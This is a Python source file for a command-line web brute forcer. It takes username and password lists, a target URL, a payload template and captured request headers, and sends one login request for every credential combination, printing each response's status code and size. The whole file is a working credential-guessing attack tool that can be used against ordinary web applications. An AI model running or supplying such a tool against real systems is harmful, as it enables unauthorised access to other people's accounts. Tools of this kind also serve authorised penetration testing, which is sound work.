import filter
import requests
import argparse

p = argparse.ArgumentParser(description='Python Web Brute Forcer')
p.add_argument('-u', '--username', type=str, metavar='', required=True, help='File containing users to brute force')
p.add_argument('-p', '--passwords', type=str, metavar='', required=False, help='File containing passwords')
p.add_argument('-t', '--url', type=str, metavar='', required=True, help='URL to send attack to')
p.add_argument('-x', '--payload', type=str, metavar='', required=True, help='Payload with [] for modified characters')
p.add_argument('-r', '--request', type=str, metavar='', required=True, help='File containing request headers')
args = p.parse_args()


def main():
    def send_attack():
        payload_data = args.payload
        # Payload that is custom modified for brute force

        f = filter.ParseWebRequest(args.request)
        f.parseRequest()
        print("Request Type: %s" % f.RequestType)

        url = args.url
        # Target url

        username = open(args.username, "r")
        count = 1

        if args.passwords is not None:

            for line in username:
                modifiedPayload = payload_data.replace("[]", line.replace('\n', ""))
                # Removes newlines from file and replaces our custom character

                password = open(args.passwords)
                for pwd in password:
                    finalPayload = modifiedPayload.replace("{}", pwd.replace('\n', ""))
                    response = requests.request(f.RequestType, url, headers=f.headers, data=finalPayload)
                    print("[+] Attack Sequence: %d" % count)
                    print("Response Status Code: %d" % response.status_code)
                    print("Byte Size: %d" % (len(response.content)))
                    print("Payload: %s " % finalPayload)
                    count += 1  # Helps number each attack sequence

            username.close()

        else:

            for line in username:
                modifiedPayload = payload_data.replace("[]", line.replace('\n', ""))
                # Removes newlines from file and replaces our custom character

                response = requests.request(f.RequestType, url, headers=f.headers, data=modifiedPayload)
                print("[+] Attack Sequence: %d" % count)
                print("Response Status Code: %d" % response.status_code)
                print("Byte Size: %d" % (len(response.content)))
                print("Payload: %s " % modifiedPayload)
                count += 1  # Helps number each attack sequence

    send_attack()


if __name__ == "__main__":
    main()
